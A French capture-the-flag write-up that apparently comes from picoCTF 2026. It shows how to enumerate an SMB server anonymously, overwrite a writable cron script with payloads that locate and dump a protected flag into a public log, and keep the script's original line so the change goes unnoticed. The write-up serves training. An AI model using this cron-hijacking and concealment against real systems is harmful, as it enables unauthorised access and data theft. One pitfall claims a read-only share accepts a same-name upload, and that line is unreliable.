# 741 — Printer Shares 3

**Événement** : picoCTF 2026 · **Catégorie** : General Skills

## Énoncé

« I accidentally left the debug script in place... Well, I think that's fine - No one could possibly access my super secure directory. »

Troisième volet de la série *Printer Shares*. Le serveur SMB de l'instance héberge cette fois un partage public et un répertoire qualifié de « super secure ».

## Analyse

### Ce que le serveur expose

`smbclient -L //<HOST> -p <PORT> -N` liste les partages en session nulle. Deux nous intéressent : `shares`, accessible sans identifiants, et `secure-shares`, protégé — c'est le « super secure directory » de l'énoncé.

Le partage public contient deux fichiers : `script.sh` et `cron.log`.

### Le raisonnement

Trois indices se recoupent et donnent la chaîne d'attaque :

- `cron.log` contient des entrées espacées d'exactement une minute ;
- `script.sh` porte le commentaire `# this script runs every minute` ;
- le script est stocké **sur le partage accessible en écriture**, pas dans un répertoire système.

Autrement dit, le cron du serveur exécute un script dont nous contrôlons le contenu. L'énoncé le dit à sa manière : le script de debug est resté en place, et le répertoire protégé n'est protégé que côté SMB — le cron, lui, tourne avec des droits qui lui permettent de lire dedans.

L'exploitation tient en trois temps : écrire une charge utile dans `script.sh`, laisser le cron la déclencher, relire `cron.log`. Ce dernier point est essentiel : il nous faut un canal de sortie, et `cron.log` en est un puisqu'il est lisible anonymement sur le même partage.

## Solution

### 1. Reconnaissance

```bash
smbclient -L //<HOST> -p <PORT> -N
smbclient //<HOST>/shares -p <PORT> -N
#   smb: \> ls
#   smb: \> get script.sh
#   smb: \> get cron.log
#   smb: \> exit
cat script.sh ; cat cron.log
```

### 2. Première charge utile : trouver le chemin du flag

Plutôt que de deviner l'emplacement, on demande au cron de chercher pour nous :

```bash
cat > script.sh << 'EOF'
#!/bin/bash
echo "Health Check: $(date)"
find / -name "*flag*" 2>/dev/null >> /challenge/shares/cron.log
EOF
```

```bash
smbclient //<HOST>/shares -p <PORT> -N -c 'put script.sh'
# attendre 60 à 70 s
smbclient //<HOST>/shares -p <PORT> -N -c 'get cron.log'
tail -20 cron.log
```

Le log révèle `/challenge/secure-shares/flag.txt`.

### 3. Seconde charge utile : exfiltration

```bash
cat > script.sh << 'EOF'
#!/bin/bash
echo "Health Check: $(date)"
cat /challenge/secure-shares/flag.txt >> /challenge/shares/cron.log 2>&1
EOF
smbclient //<HOST>/shares -p <PORT> -N -c 'put script.sh'
```

### 4. Attendre et récupérer

```bash
until grep -q 'picoCTF' cron.log; do
  smbclient //<HOST>/shares -p <PORT> -N -c 'get cron.log'
  sleep 10
done
tail -5 cron.log
```

Le `grep -q` évite de relire tout le log à chaque tour et la boucle s'arrête dès que la ligne du flag apparaît. On peut aussi paralléliser l'attente avec une simple boucle `for i in $(seq 1 10)` si l'on préfère un nombre d'essais borné.

### Pourquoi ça marche

Le contrôle d'accès SMB ne protège que l'accès **réseau** au partage. Le cron, lui, s'exécute localement avec l'identité du compte de service, qui a le droit de lire `secure-shares`. En plaçant notre code dans un fichier que ce compte exécute périodiquement, on hérite de ses droits : c'est un détournement de tâche planifiée, pas une faille du protocole SMB. `cron.log` sert de canal de retour parce qu'il est lisible anonymement, ce qui referme la boucle sans jamais toucher au partage protégé.

## Pièges

- **Les fins de ligne.** Un `script.sh` édité sous Windows arrive avec des CRLF ; le shebang devient `#!/bin/bash\r` et le noyau cherche un interpréteur qui n'existe pas. On écrit le fichier en LF et on vérifie avec `file script.sh` — on veut `ASCII text`, pas `with CRLF line terminators`.
- **Le délai.** Le cron ne se déclenche pas à la seconde où le script est déposé : entre 0 et 60 s selon la position dans la minute. La boucle `until` est plus fiable qu'un `sleep 60` unique.
- **Écraser sans perdre la structure.** On garde la ligne `echo "Health Check"` du script d'origine : le log reste cohérent et rien ne signale que le script a été remplacé.
- **Le log périmé.** `cron.log` évolue côté serveur ; il faut le re-télécharger au lieu de relire la copie locale obtenue à l'étape 1.
- **Les droits du partage.** Si le `put` échoue en `NT_STATUS_ACCESS_DENIED`, c'est que le partage est en lecture seule pour la session nulle : dans ce cas le `put` doit se faire sur le même chemin mais avec un fichier de même nom, et non dans un sous-répertoire.

## Flag

Flag validé sur la plateforme (valeur non conservée).
